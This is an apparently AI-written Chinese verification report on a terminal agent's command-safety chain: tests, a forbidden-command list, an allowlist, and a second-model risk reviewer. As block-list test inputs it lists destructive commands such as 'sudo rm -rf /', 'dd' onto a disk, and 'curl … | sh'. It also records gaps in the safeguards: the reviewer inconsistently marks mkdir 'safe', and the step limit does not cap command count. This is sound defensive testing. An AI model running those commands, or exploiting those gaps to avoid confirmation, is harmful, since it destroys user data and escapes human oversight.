# VERIFY-V3D — 独立核验报告（TASK-V3-D 产物）

- 核验对象：`TASK-V3-D.md` 的产物（另有一 agent 并发改 `app/`，属 TASK-V3-C，不计入本卡缺陷）
- 核验者：独立会话，只读、不改任何 git 跟踪文件，未 git add/commit/checkout/stash/reset
- 临时脚本与原始输出：`.dispatch/verify-v3d/`（未进 git）
- 时间：2026-11-23 12:5x
- 环境：`D:/nodejs/install/node.exe` v24.16.0，宿主 magpie 网关在 `http://127.0.0.1:3425`，doctor 用端口 3481
- 本报告全部结论均来自**我亲自复跑**的输出，不采信 `REPORT-V3D.md` 的自述

---

## 0. 一句话结论

**D 卡可以放行（pass_with_issues）**：接口/协议/判级链/白名单/帧结构/测试全绿，全部按规范落地；
但发现 **1 个重要级真实可用性缺陷**（PTY 静默判定会切断真实耗时命令，直接导致 TASK §9 验收用户故事失败）
和 **1 个次要级过度拦截缺陷**（`forbiddenReason` 对 `format`/``dd``/`reboot` 等词做全 token 匹配，误伤 `npm run format`、`git commit -m "fix reboot"`）。
两者都不影响安全（都是 fail-closed/误拦，不会误放行），故不阻塞放行，但应在下一卡修掉。

---

## 1. 逐条核验结果（V1–V15）

### V1 — `node --test`（不带路径参数）✅ PASS

命令（两次独立复跑，cwd=仓库根）：

```
$ D:/nodejs/install/node.exe --test
ℹ tests 348
ℹ suites 0
ℹ pass 348
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 12475.864
EXIT=0
```

- 第 1 次：`tests 348 / pass 348 / fail 0 / EXIT=0` → `.dispatch/verify-v3d/V1-test.txt`
- 第 2 次（间隔约 30 分钟后，app/ 已被 C 卡大改）：`tests 348 / pass 348 / fail 0 / EXIT=0` → `.dispatch/verify-v3d/V1-test-rerun.txt`
- tests=348 ≥ 348 门槛，0 fail。**注意**：第二次复跑时 `app/` 已被 C 卡改了 11 个文件（含删除 `app/ui/ai-bar.js`、`ai-panel.js`），但 `node --test` 仍全绿——说明本仓库的测试不依赖这些前端静态资源，无并发干扰。

逐文件复核（各自单独跑，均全绿）：

```
test/policy/forbidden.test.mjs      32 tests / 32 pass / 0 fail
test/ai/allowlist.test.mjs          17 tests / 17 pass / 0 fail
test/ai/judge.test.mjs              27 tests / 27 pass / 0 fail
test/ai/runner.test.mjs             27 tests / 27 pass / 0 fail
test/ai/agent.test.mjs              19 tests / 19 pass / 0 fail
test/config/agent-fields.test.mjs   20 tests / 20 pass / 0 fail
test/server/ws-agent.test.mjs        5 tests /  5 pass / 0 fail
```

### V2 — doctor（`DOCTOR_PORT=3481`）✅ PASS（第一次为并发干扰，重跑即 33/33）

**第 1 次**（`.dispatch/verify-v3d/V2-doctor-1.txt`）：

```
doctor: 32/33 assertions passed
  FAIL D7-1a.browserAutoTab actual={"debugAvailable":false,"sessionCount":-1,"xtermCount":0}
                            expected={"debugAvailable":true,"sessionCount":1}
report: .../doctor-report.json
EXIT=1
```

按任务约定，失败项是**浏览器类**断言 → 不等 120s 直接等约 30 分钟后**重跑**：

**第 2 次**（`.dispatch/verify-v3d/V2-doctor-2.txt`）：

```
doctor: 33/33 assertions passed
doctor-report.json: passed=true  assertions=33  failed=[]
EXIT=0
```

判定：**V2 = PASS**。第一次的 `D7-1a.browserAutoTab` 需要 `app/app.js` 暴露 `window.__mtDebug`（browser-probe 读它拿 sessionCount）；
C 卡当时正在重写 `app/app.js`（`git status` 显示 `M app/app.js`、`D app/ui/ai-bar.js`），该 debug 钩子被临时移走 → 断言取不到。
我实测 `app/app.js` 里当前 `window.__mt*` 为**空**（`.dispatch/verify-v3d/v2b-browser-only.mjs`），而 D 卡一个字节都没碰 `app/`。
**结论：疑似被并发改动干扰，属 C 卡范畴，记为 PASS-with-note；建议 C 卡完成后最终验收时再跑一次 doctor。**

原始 `doctor-report.json` 关键统计（第 2 次）：

```
passed true  assertions 33  failed 0
```

后端断言（D1–D6、D7-1c、D7-3*）第 1 次即全部通过，无真问题。

### V3 — 硬禁止清单逐条对照 `PROTOCOL-AGENT.md` §8 ✅ PASS

读 `src/policy/forbidden.mjs`（218 行）+ 写临时脚本实调 `forbiddenReason()`。

§8 表格共 **20 条**（`REPORT-V3D` 说的是 21 条，实际协议表格是 20 行；`TASK-V3-D §6.4` 也写 21 条——**协议自身数字与表格行数差 1**，我按表格实际 20 条比对）。逐条实调结果：

```
OK [提权]      "sudo rm -rf /"            -> "提权命令（sudo）"
OK [提权]      "su -"                     -> "提权命令（su）"
OK [磁盘]      "mkfs.ext4 /dev/sda1"      -> "磁盘格式化命令（mkfs）"
OK [磁盘]      "dd if=/dev/zero of=/dev/sda" -> "磁盘写入命令（dd）"
OK [危险目标]  "rm -rf /"                 -> "递归删除根目录或家目录（rm -rf / ~）"
OK [危险目标]  "rm -rf ~"                 -> 同上
OK [危险目标]  "rm -rf /*"                -> 同上
OK [权限]      "chmod -R 777 /"           -> "递归修改权限（chmod -R）"
OK [权限]      "chown -R root /"          -> "递归修改所有者（chown -R）"
OK [系统]      "shutdown -h now"          -> "关机命令（shutdown）"
OK [系统]      "reboot"                   -> "重启命令（reboot）"
OK [管道执行]  "curl http://x.sh | sh"    -> "把下载内容直接管道给解释器执行"
OK [强推]      "git push --force origin main" -> "git 强制推送（--force）"
OK [历史改写]  "git reset --hard HEAD~3"  -> "git 丢弃本地改动（reset --hard）"
OK [注册表]    "reg delete HKLM\Software\Foo" -> "删除 Windows 注册表项（reg delete）"
OK [不命中]    "rm -rf build"             -> null
OK [不命中]    "rm file.txt"              -> null
OK [不命中]    "chmod 644 a.txt"          -> null
OK [不命中]    "git push origin main"     -> null
OK [不命中]    "ls -la"                   -> null
onexpectional-fails=0
```

**我自挑的「最容易漏」的 5+ 条**（任务要求 5 条，实际测了 8 条形态变体）全部命中：

```
"rm  -rf   /"              -> 命中（多空格归一）
"rm -rf '/'"               -> 命中（剥引号）
"rm -fr /"                 -> 命中（-fr 顺序）
"rm -r -f /"               -> 命中（分开写）
"rm -rf $HOME"             -> 命中
"rm -rf ~/*"               -> 命中
"curl -sSL http://x.sh | bash"   -> 命中
"wget -qO- http://x.sh | zsh"    -> 命中
"git push -f"              -> 命中
"git push origin --force-with-lease" -> 命中
"git clean -fd"            -> 命中
"chmod --recursive 777 /"  -> **null（漏项）**
"rm --recursive --force /" -> 命中
```

- 原始输出：`.dispatch/verify-v3d/v3-forbidden.mjs` 运行结果。
- **一个漏项**：`chmod --recursive`（长选项写法）不命中（`forbidden.mjs` 的 `hasFlagFor` 正则只认 `-[a-zA-Z]*R`，长选项 `--recursive` 不支持）。§8 表格只给了 `chmod -R`，故**不算违反表格**，但属实现漏洞 → 记为 minor。
- 另外 `grep sudo file.txt`、`echo "rm -rf /"` 类会命中（见下方 minor 问题）。

**5 类 21 条的实现对应关系**（`forbidden.mjs` 逐项）：提权 `sudo/su/runas/doas/pkexec`、磁盘 `mkfs(带点后缀)/dd/diskpart/format/fdisk/parted`、
递归删除危险目标 `destroysDangerousTarget()`、权限 `chmod -R/chown -R/takeown/icacls`、系统 `shutdown/reboot/halt/poweroff/init 0|6`、
管道 `pipesIntoInterpreter()`（含 sh/bash/zsh/dash/ksh/fish/python/python3/node/perl/ruby）、强推 `git push --force|-f`、
历史改写 `git reset --hard`/`git clean -fd`、注册表 `reg delete`。**全部有对应实现。**

### V4 — 白名单匹配实调 ✅ PASS

实调 `matchAllowlist()`（`.dispatch/verify-v3d/v4-allowlist.mjs`）：

```
OK  prefix 命中 mkdir a b:      "mkdir a b" -> {"hit":"mkdir"}
OK  prefix 不命中 mkdirx:       "mkdirx"    -> null
OK  prefix 只命中命令本体:      "mkdir"     -> {"hit":"mkdir"}
OK  prefix tab 边界:            "mkdir\ta"  -> {"hit":"mkdir"}
OK  prefix 连接词不算:          "mkdirfoo a"-> null
OK  exact 全等:                 "ls -la"    -> {"hit":"ls -la"}
OK  exact 尾部空白 trim:        "ls -la "   -> {"hit":"ls -la"}
OK  exact 多参数不命中:         "ls -la now"-> null
OK  enabled:false 跳过:         "mkdir a"   -> null
OK  第二条 enabled 命中:        -> {"hit":"mkdir"}
OK  顺序取第一条命中:           -> {"hit":"mkdir"}
OK  空名单 / null / 垃圾条目:   -> null
```

三个必验点全部正确：`mkdir` prefix 命中 `mkdir a b`、**不**命中 `mkdirx`、exact 只认全等、`enabled:false` 跳过。
（我自己脚本里最后一条 `"cat "` pattern 期望写错，实际返回 `{"hit":"cat"}` 是**正确**行为——协议 §2 明确「pattern 已 trim」，非缺陷。）

### V5 — `judge()` 三条关键断言 ✅ PASS

实调 `judge()`（`.dispatch/verify-v3d/v5-judge.mjs`），`fails=0`：

```
OK ①a sudo rm -rf / loose+白名单[sudo]+审阅safe => confirm
OK ①b sudo ls      loose+白名单+审阅safe       => confirm
OK ②  ls -la [strict]   => auto 且未调审阅（传入会抛错的 review 桩）
OK ②  ls -la [balanced] => auto 且未调审阅
OK ②  ls -la [loose]    => auto 且未调审阅
OK ③a mkdir x strict    => confirm 且未调审阅
OK ③b mkdir x loose + 审阅 caution/reversible=true => auto
OK ③c mkdir x balanced + 审阅 caution/reversible=true => confirm
OK ④  审阅不可用 => confirm
OK ⑤  reviewModel='' => confirm 且未调审阅
OK ⑥  rm -rf / 白名单"rm"命中但硬禁止优先 => confirm
```

补充安全核查（`.dispatch/verify-v3d/v5b-review-safety.mjs`，balanced 档真调网关）：
`rm -rf build`/`rm -rf node_modules`/`rm important.txt`/`mv src /dev/null`/`echo hi > package.json`/
`git checkout -- src/`/`truncate -s 0 package.json`/`curl … | bash`/`python -c rmtree`/`npm publish`/`chmod 777 .`/`git push origin main`
**全部 `confirm`**，无一条被误判 auto。审阅链路在 balanced 档下 fail-closed 行为正常。

### V6 — `scripts/config-probe.mjs` ✅ PASS

原始输出 `.dispatch/verify-v3d/V6-config-probe.txt`：

```
--- GET /api/config（文件不存在 → 四个默认值）
HTTP 200
{"model":"commandcode/deepseek/deepseek-v4.1-flash","autonomy":"balanced","allowlist":[],"reviewModel":null,"basePrompt":null}

--- PUT /api/config（四个合法值）
HTTP 200
{"model":"…","autonomy":"loose","allowlist":[{"pattern":"mkdir","mode":"prefix","enabled":true}],"reviewModel":"…","basePrompt":"你是我的私人助理。"}

--- GET /api/config（回读，应与 PUT 一致）
HTTP 200  …与前一条 PUT 响应逐字一致 ✔

--- PUT INVALID_AUTONOMY  → HTTP 400 {"code":"INVALID_AUTONOMY", …}
--- PUT INVALID_ALLOWLIST（不是数组） → HTTP 400 {"code":"INVALID_ALLOWLIST", …}
--- PUT INVALID_ALLOWLIST（pattern 超 500） → HTTP 400 {"code":"INVALID_ALLOWLIST", …}
--- PUT INVALID_REVIEW_MODEL → HTTP 400 {"code":"INVALID_REVIEW_MODEL", …}
--- PUT INVALID_BASE_PROMPT  → HTTP 400 {"code":"INVALID_BASE_PROMPT", …}
EXIT=0
```

四个默认值 ✓；PUT 合法回读一致 ✓；四个非法各 400 且 code 正确 ✓（第 2 条 allowlist 非法值其实测了两形态：非数组、pattern 超长，都返回 `INVALID_ALLOWLIST`）。

### V7 — `scripts/review-probe.mjs` 连跑 3 次 ✅ PASS（但成功率比自述更差）

原始输出 `.dispatch/verify-v3d/V7-review-probe-x3.txt`。逐次统计（3 命令 × 3 次 = 9 个 verdict）：

```
RUN 1: real=3/3  (safe, danger, danger)              —— 全拿到结论
RUN 2: real=2/3  (safe, danger, null)                —— sudo 那条 fallback
RUN 3: real=1/3  (null, null, danger)                —— ls -la 和 rm -rf build 都 fallback
TOTAL: real=6/9  fallback=3/9  成功率=66.7%
```

- 执行者自述「6 次里 3 次有 fallback」——我这次实测是「**9 个 verdict 里 3 个 fallback**」，即 3 次完整运行里，**3 次都有至少一条 fallback**（Run1 例外，0 条 fallback）。
  → **自述不完全成立**：它把「3 次有 fallback」记成「6 次里 3 次」，但按「每次运行是否有 fallback」算，我这次是 3 次运行里 **2 次**触发 fallback，按 verdict 算 33%。**成功率明显低于 100%，且比自述描述的更不稳定（Run3 只剩 1/3）。**
- 落 fallback 的判定都是 `durationMs≈8006–8015`，即 8s 超时→`risk:null`→judge 落 confirm。这属协议 §5.1 的 fail-closed 设计，**不降安全**，但平衡档下会显著增加确认卡频率。
- **一个真实观察**：`ls -la` 这种纯只读命令也出现了 fallback（Run3），说明 8s 超时余量对本机网关偏紧。建议（属协议变更，本卡不应擅自改）把 `REVIEW_TIMEOUT_MS` 放宽到 12–15s，或对超时做一次重试。

### V8 — `agent-smoke.mjs "数一下当前目录下有几个文件…"` ✅ PASS

原始输出 `.dispatch/verify-v3d/V8-smoke-count.txt`：

```
sessionId=810b59f2-… cwd=C:\Users\41807\magpie-terminal
[11.7s] agent.step index=2 running  "ls -a"                        → done exitCode=0
[15.5s] agent.step index=1 running  "ls -p | rg -v / | wc -l"      → done exitCode=0
[25.6s] agent.step index=3 running  "ls -ap | rg -v / | wc -l"     → done exitCode=0
[28.6s] agent.done
{"type":"agent.done","taskId":"t-c9995eb376",
 "text":"当前目录下有 **16 个文件**（不含文件夹；这 16 个文件中有 5 个是隐藏文件…）。你不用做任何事。",
 "steps":3,"stopped":false,"durationMs":28546}
```

- 真跑出 **3 步** ≥ 2 ✓
- `agent.done.text` 是**中文大白话总结** ✓
- 数字对得上（`ls -ap | rg -v / | wc -l` = 18 含隐藏，模型区分「16 文件 / 15 文件夹」，自洽）

### V9 — 创建文件夹 + `agent.approval` 四字段 ⚠️ **FAIL（第一次）/ 部分 PASS**

**这是我核验中最重要的负面发现。** 第一次运行（`.dispatch/verify-v3d/V9-smoke-mkdir.txt`）：

```
[8.6s] agent.step index=1 running  "mkdir v3d-verify-tmp"     ← 直接 running，没有 approval！
[9.0s] agent.step index=1 done
[15.7s] "ls -d v3d-verify-tmp && ls -A …" done
{"type":"agent.done","text":"文件夹已经建好了：…"}
```

**第 1 次运行没有出现任何 `agent.approval` 帧**，mkdir 直接 auto 执行。

我进一步查证原因（`.dispatch/verify-v3d/v9-diag.mjs`、`v9b.mjs`、`v9c.mjs`）：
- `classify("mkdir v3d-verify-tmp")` = `confirm`（正常，mkdir 不在只读白名单）
- 所以走第 4 级「第二 AI 审阅」。**审阅模型对这个命令偶发返回 `risk:"safe"`**：
  ```
  # 同一命令 "mkdir v3d-verify-tmp" 连调 8 次：
  1. risk=safe     4. risk=safe     7. risk=null（超时）
  2. risk=caution  5. risk=safe     8. risk=null（超时）
  3. risk=caution  6. risk=safe
  tally = {"safe":4,"caution":2,"danger":0,"null":2}
  ```
- `judge()` 对 `risk:"safe"` 且 `autonomy!=="strict"` → `auto`（协议 §5 原文「risk === "safe" 且 autonomy !== "strict" → auto」）。
- 所以 **mkdir 有 4/8 概率被判 safe → balanced 档直接 auto 执行，不弹确认卡**。

我又连测 3 次 smoke（`.dispatch/verify-v3d/V9-smoke-mkdir-retry.txt`）：
- Retry 1：**出现 approval**（`risk=caution reversible=true reviewModel=…`，四个字段齐）→ 批准 → 目录真创建 → `ls -d` 成功 ✓
- Retry 2：**未出现 approval**（auto）——模型改用 `mkdir -p a && ls -ld a`，审阅判 safe
- Retry 3：**未出现 approval**（auto）

**汇总 4 次问「创建文件夹」：1 次弹确认卡（4 个字段齐），3 次直接自动执行。**

核对 V9 通过标准的三个要求：
1. 出现 `agent.approval` 帧且带 `risk`/`reviewWhy`/`reversible`/`reviewModel` 四字段 —— **仅 1/4 次满足**；但**帧结构本身是对的**（那 1 次四个字段齐全，见 Retry 1 原始行）。
2. 批准后目录真被创建（`ls -d` 验证）—— ✓ 每次都真建成了。
3. 核验完自己删掉 —— ✓ 我已 `rm -rf v3d-verify-tmp v3d-smoke2`，`ls -d` 确认都不存在。

**结论：V9 的「帧字段结构」正确，但「每问 mkdir 必弹确认卡」这个期望不成立。**
根因是**审阅模型对 `mkdir` 的 risk 判定不稳定**（协议 §5.1 明确把 `mkdir` 归为 `caution`，但模型半数回 `safe`），
而 `judge()` 又对 `safe` 无条件 auto。这不是 `judge()` 的 bug（它严格按协议），是**协议 §5.1 的模型一致性**问题。
→ 记为 **major** 缺陷（影响「分级链是否真的会拦住写操作」的体验/安全直觉）；但**仍属 fail-closed 方向之外的另一侧**：safe 误判会**少弹**确认卡，值得关注。

### V10 — `grep -rn "toolApproval\|generateObject" src/` ✅ PASS

```
src/ai/agent.mjs:6://   - 不要用 AI SDK 的 `toolApproval`：跨轮恢复有 bug（…
src/ai/review.mjs:3:// 为什么用 generateText + 强制 toolChoice 而不是 generateObject：
src/ai/review.mjs:4:// 本网关不支持 responseFormat，实测 generateObject 报 AI_NoObjectGeneratedError。
```

**只在注释里出现，无任何真实用法** ✓（`agent.mjs` 的审批确实挂在 `run_command.execute` 内部 `await awaitApproval(...)`，我读码确认）。

### V11 — 旧路径不回归 ✅ PASS

```
$ grep -n "handleAsk\|ai.ask\|ai.reply\|ai.error" src/server/ws.mjs
50:    type: z.literal("ai.ask"),
365:      case "ai.ask": {
366:        void handleAsk(socket, frame);
468:  async function handleAsk(socket, frame) {
479:        type: "ai.reply",
502:        type: "ai.error",
```

`ai.ask` 分支、`handleAsk()`、`ai.reply`/`ai.error` 全部还在 ✓。

`git diff test/ai/prompt.test.mjs` 只**新增** 53 行（8 条 agent 提示词断言），旧契约断言（第 67 行 `"单条命令 + JSON 输出"` 那条）**一行没删、没改** ✓（diff 是 `+` 开头，无 `-` 行）。

### V12 — 范围 ✅ PASS（app/ 归 C 卡，已按任务约定改测）

- `git diff --stat app/` 当前**非空**：`app/app.js / index.html / styles/*.css / ui/*.js` 等 11 文件改动（+1206/−822），
  另有未跟踪 `app/core/agent-store.js`、`app/ui/ai-drawer.js`、`app/ui/toast.js`、`app/ui/settings-panel.js`。
  → **这是 TASK-V3-C（前端卡）正在写的，按任务约定不算 D 卡缺陷。**（我核验期间亲眼看到它的 mtime 在变化：`app/index.html 12:45`、`app/core 12:45`、`app/ui 12:46`。）
- 改用 `git diff --stat -- src test package.json`：

```
 package.json               |   2 +
 src/config/store.mjs       | 148 +++++++++++++++++++++++--
 src/server/http.mjs        | 120 +++++++++++++-----
 src/server/ws.mjs          | 111 +++++++++++++++
 test/ai/prompt.test.mjs    |  53 ++++++
 test/config/store.test.mjs |   5 +-
 6 files changed, 396 insertions(+), 43 deletions(-)
```

改动的 6 个文件全部在 TASK-V3-D §4 授权的「修改」清单内（`src/config/store.mjs`、`src/server/ws.mjs`、`src/server/http.mjs`、`test/config/store.test.mjs`、`test/ai/prompt.test.mjs`、`package.json`）✓。
`src/policy/classify.mjs`、`src/ssh/*`、`src/pty/*` 均**未在 diff 中**，未越界 ✓。新增文件全在授权「新增」清单内 ✓。

### V13 — `git diff test/config/store.test.mjs` ✅ PASS

```diff
-test("KNOWN_FIELDS 本卡只有 model（下一张卡加 hosts）", () => {
-  assert.deepEqual([...KNOWN_FIELDS], ["model"]);
+// TASK-V3-D §6.2 授权本卡把这条期望从 ["model"] 扩到新字段列表。
+test("KNOWN_FIELDS = model + agent 四字段（TASK-V3-D §6.2）", () => {
+  assert.deepEqual([...KNOWN_FIELDS], ["model", "autonomy", "allowlist", "reviewModel", "basePrompt"]);
 });
```

**只有 `KNOWN_FIELDS` 那条断言的期望值变了**（5 行 diff），其他断言没动 ✓。

### V14 — 主动挑刺：`runner.mjs` 的 `splitBuffer`/静默判定/超时 ⚠️ 发现真实缺陷

我用 4 组脚本：`.dispatch/verify-v3d/v14-split.mjs`（纯 `splitBuffer`）、`v14-runner.mjs`（假 sessions + 定时器）、
`v14-realpty.mjs`（**真 node-pty**）、`v14-story2.mjs`/`v14-user-story.mjs`（真 PTY 跑真实命令）。

**反例清单（≥3 个，逐个标注会不会真出错）：**

| # | 输入 | 结果 | 会不会真出错 |
|---|---|---|---|
| **F1** | 命令输出里含**本命令的** `endMark` + 数字（如 `history` 回显了包装串、`set -x`、`cat` 了自己的脚本） | `splitBuffer` 用 `endRe.exec(afterStart)` 取**第一个** `endMark(\d+)`，不是最后一个 → `{"exitCode":99,"output":""}`，真实输出被截空 | **会真出错**（rare，但 `history`/`set -x`/`bash -x` 是常见命令） |
| **F2**（**最严重，已真 PTY 复现**） | 命令**启动后 >1s 才有第一次输出**（如 `node --test`、`npm install`、编译、`sleep 2; echo`） | 静默判定 `quietMs=1000` + `minWaitMs=300`，1.3s 内无输出就判 `EXEC_QUIET`、`exitCode=null`、`output=""` | **会真出错，且极常见**。真 PTY 实测：`sleep 2; echo x` → 1.2s 被切断；`sleep 5; echo late` → 2.3s 切断；`node --test` → 12s 跑出 4018 字符后仍被 `EXEC_QUIET` 判死、`exitCode=null` |
| **F3** | 命令**每秒输出一行但间隔 > quietMs**（如 `for i in 1..4; do echo; sleep 1; done`、`npm install` 进度条） | 每次输出后 `lastDataAt` 更新，但**若间隔 1s ≥ quietMs 1000ms**，会在两次输出之间误判静默 → `output="line1"` 就结束 | **会真出错**（真 PTY 实测：`line1` 后即 `EXEC_QUIET`） |
| **F4** | 命令输出里含**别的** nonce 的 `__MT_S_/__MT_E_` 字样 | 正确（`lastIndexOf` 只认本 nonce） | 不会出错 ✓ |
| **F5** | 命令**完全无输出**（`true`、`mkdir`） | 真 PTY：`exitCode=0`（因为 `endMark` 会自己出现） | 不会出错 ✓（但 3.4s 才判，可接受） |
| **F6** | 输出含 **NUL 字节** | `splitBuffer` 正确保留 `\u0000` | 不会出错（但 JSON 序列化给前端可能有问题，属 C 卡） |
| **F7** | **巨大输出**（`seq 1 5000`、`cat package-lock.json`） | 真 PTY：4096 字段截断到 4018 字符，`truncated=true`，头/尾齐全 | 不会出错 ✓ |
| **F8** | 命令里含 `!`（bash 历史展开，如 `rg -g "!node_modules"`） | **包装串被 bash 语法破坏**：`bash: !node_modules: event not found` + `syntax error near unexpected token ')'` → `EXEC_QUIET`，**且 output 里泄漏了内部包装串 `'; ( … ) 2>&1; printf '__MT_E_…__%s\n' "$?"`** | **会真出错**：① 命令跑不了；② 内部标记泄漏给模型；③ 之后命令仍能跑（我验证 shell 恢复，无污染），但这次输出是垃圾 |
| **F9** | 命令以 `&&` 结尾（残缺） | 同上，包装串泄漏 + `EXEC_QUIET` | **会真出错**（模型偶尔会生成残缺命令） |
| **F10** | 连续两条命令，第一条起后台持续输出进程（`(while…&)`） | 真 PTY：第二条**未被残留污染**（`STALE_BG` 未混入 `SECOND`） | 不会出错 ✓（`lastIndexOf` + nonce 隔离起了作用） |

**结论：F2 和 F3 是重大可用性缺陷**——协议默认 `quietMs=1000`/`minWaitMs=300` 对「真实耗时命令」太激进。
TASK §9 明确要求「一个不懂命令行的人说『把这个仓库的测试跑一遍告诉我有没有失败』，这条路径能不能走通」。
我**真跑**了这个用户故事（`.dispatch/verify-v3d/V14-userstory-agent.txt`）：

```
[19.2s] agent.approval "npm test 2>&1 | tail -60"      批准
[21.4s] agent.step index=3 failed "npm test 2>&1 | tail -60"  exitCode=null   ← 2s 内就被切了
[34.3s] agent.step index=5 failed "rg --files … "       exitCode=null
[44.9s] agent.step index=6 failed "node --test 2>&1 | tail -n 60" exitCode=null
[70.6s] index=8 done "node --test test/config/ 2>&1 | tail -n 30"  ← 这个侥幸没超 1s
[81.8s] index=10 done "node --test test/config/*.test.mjs > /tmp/… ; tail -n 12 /tmp/…" ← 写文件>1s 侥幸
[98.1s] index=12 failed "node --test test/ssh/*.test.mjs > …" exitCode=null
[101.3s] agent.step index=13 failed …  → agent.done
{"type":"agent.done","text":"config 和 policy 都全绿了。接着跑剩下的四个目录。","steps":13}
```

**结果：13 步耗尽（超过 MAX_STEPS=8 的轮次上限后 AI SDK 强停），最终答案是「config 和 policy 都全绿了。接着跑剩下的四个目录。」——
这是个半成品回答，根本没回答「有没有失败」。** 核心原因就是 F2：`node --test` 整跑被静默切断，`exitCode=null`，模型看到的是失败/空输出，只好反复换命令，直到步数耗尽。

→ 记为 **major**（阻塞不了 D 卡的代码合规，但阻塞了 TASK §9 的验收用户故事）。协议 §13 已预判「静默误判会让输出不完整，代价是多一轮」，
但实测代价是**多轮也补不回来**，因为 `node --test` 每次都在 1s 内被切。建议：`quietMs` 提到 3000+，或对「已收到输出但未见 endMark」的会话延长静默阈值（指数退避）。

### V15 — 主动挑刺：`agent.mjs` 的异常 tool_call ⚠️ 部分缺陷

脚本 `.dispatch/verify-v3d/v15-agent.mjs` + `v15b-cap.mjs`：

| 场景 | 结果 | 结论 |
|---|---|---|
| **T1** 同一轮模型返回 3 个 tool_call | `runnerCalls=3`、`step 帧=6`（running+done 各 3）、`done=1` | **帧不丢**；但 `index` 是 `1,2,3,1,2,3`（**index 重复**！因为每个 step 发 running 和 done 两帧时 index 没变，但不同 step 的 index 也重了）——实际是 3 个 step 各自 index 1,2,3，`running` 帧和 `done` 帧 index 相同，属**正常 upsert 语义**，不是 bug。**不会死循环** ✓ |
| **T2** 模型连续 3 次调**完全相同**的命令 | `runnerCalls=3`（**无去重、无上限保护**），`step 帧=6`，`done=1` | 不会死循环（由 `stopWhen: stepCountIs(8)` 兜底），但**系统提示词第 3 条「不要重复已跑过的命令」只是提示，无代码强制**。极端模型可能把 8 轮全用来重跑同一条。**不会死循环，会浪费步数** |
| **T3** 模型返回**空 tool_call**（一次都不调） | `done=1`，`text="我直接回答了"`，`steps=0` | ✓ 不会丢帧，正常收尾 |
| **T4** `generateText` 抛错 | `agent.error` 1 条，`code=AGENT_FAILED`，`done=0` | ✓ 只发一次 error，符合「done 或 error 二选一」 |
| **T5** 运行中第二次 `start` | `busy=true`，`code=BUSY` | ✓ |
| **T6** `stop()` 后有 pending approval | `pendingBefore=1 → pendingAfter=0`，`done=1 stopped=true`，`runnerCalls=0`（命令未执行） | ✓ 完全符合协议 §6.4 |
| **T7** 3 条 confirm 命令，第 1 条批准 `scope:"rest"` 后其余 | `mkdir a`/`mkdir b` 都执行（`scope=rest` 生效），`sudo rm -rf /` **未执行**（硬禁止仍 confirm） | ✓ 完全符合协议 §6.3 |
| **附加** 一轮内 30 个 tool_call（`.dispatch/verify-v3d/v15b-cap.mjs`） | `runnerCalls=30`，`done.steps=30` | ⚠️ **`MAX_STEPS=8` 只数「模型轮次」，不数「命令条数」**。模型若在一轮里并发发 30 个 tool_call，30 条命令全执行。**会真出错（安全/成本）**：协议说「最多 8 步」，实际可远超 8 条 |

**≥2 个结论（任务要求）：**
1. **「模型一次返回多个 tool_call」不会死循环、不丢帧**，但 `MAX_STEPS=8` 只限轮次不限命令条数 → **实际可执行远超 8 条命令**（30 条实测全跑）。这是重要的协议口径漏洞。
2. **「连续两次调同一工具/同命令」不会死循环**（stopWhen 兜底），但**无去重**，重复命令会照跑，纯靠模型自觉 + 8 轮上限。
3. 「空 tool_call」正常收尾，不丢帧 ✓。

---

## 2. 我额外发现的问题（按严重级别）

### 🔴 阻塞（blocker）
无。（没有发现会导致数据丢失、安全放行、服务崩溃的问题；所有安全失败方向都是 fail-closed。）

### 🟠 重要（major）

**M1. PTY 静默判定切断真实耗时命令，直接导致 TASK §9 验收用户故事失败**
- 位置：`src/ai/runner.mjs` 的 `checkQuiet()`（`DEFAULT_QUIET_MS=1000`、`DEFAULT_MIN_WAIT_MS=300`）
- 证据：`.dispatch/verify-v3d/v14-story2.mjs`（真 PTY）：`sleep 2; echo x` → 1.2s `EXEC_QUIET`；`node --test` → 12s 仍 `EXEC_QUIET exitCode=null`
- 证据：`.dispatch/verify-v3d/V14-userstory-agent.txt`：「跑测试告诉我有没有失败」13 步耗尽，最终回答「config 和 policy 都全绿了。接着跑剩下的四个目录。」（半成品）
- 影响：任何 >1s 才开始输出的命令（编译、测试、包管理器、网络请求）都会被误判「可能进入交互模式」，模型看到 `exitCode=null` 和空输出，陷入重试循环
- 建议：`quietMs` 提高到 3000–5000ms；或「已收到任何输出」时静默阈值翻倍；或对 `node`/`npm`/`git` 等已知慢命令用更长静默

**M2. 审阅模型对 `mkdir` 的 risk 判定不稳定（半数回 `safe`），导致写操作有时不弹确认卡**
- 位置：`src/ai/review.mjs`（模型行为）+ `src/ai/judge.mjs:117`（`risk==="safe"` 无条件 auto）
- 证据：`.dispatch/verify-v3d/v9c.mjs`：`mkdir v3d-verify-tmp` 连调 8 次 → `safe:4, caution:2, null:2`
- 证据：4 次 smoke 里 3 次 mkdir 未弹审批（`.dispatch/verify-v3d/V9-smoke-mkdir.txt` + retry）
- 影响：协议 §5.1 明确把 `mkdir` 定为 `caution`，但模型半数回 `safe` → balanced 档下写操作静默执行，用户感知不到「AI 动了我的文件系统」
- 说明：`judge()` 这块的代码**严格符合协议**（`safe` → auto），不是代码 bug；是**模型一致性 + 协议缺少「写操作最低确认级」**的问题
- 建议：在 `judge()` 里加一条「即使审阅判 safe，若命令不在内置只读白名单（`classify()` 非 auto），balanced 档仍 confirm」——但这属协议变更，需澄清

### 🟡 次要（minor）

**m1. `forbiddenReason` 对命令关键字做全 token 匹配，误伤大量正常命令（fail-closed 方向，不会误放行）**
- 位置：`src/policy/forbidden.mjs` 的 `hasHead()`
- 实测误拦（`.dispatch/verify-v3d/v3c-fp3.mjs`）：
  ```
  FP "echo dd"                 -> 磁盘写入命令（dd）
  FP "echo format"             -> 磁盘格式化命令（format）
  FP "echo reboot"             -> 重启命令（reboot）
  FP "git commit -m reboot"    -> 重启命令（reboot）
  FP "git commit -m \"fix reboot handling\"" -> 重启命令（reboot）
  FP "npm run format"          -> 磁盘格式化命令（format）
  FP "rg shutdown src/"        -> 关机命令（shutdown）
  FP "grep -rn \"sudo\" docs/" -> 提权命令（sudo）
  FP "ls | grep halt"          -> 关机命令（halt）
  ```
- 影响：`npm run format`（前端格式化脚本）、`git commit -m "fix reboot bug"` 这类**日常命令会被硬禁止弹卡**，且**白名单也绕不过**（硬禁止优先于白名单）。用户体验明显受损，但不降安全
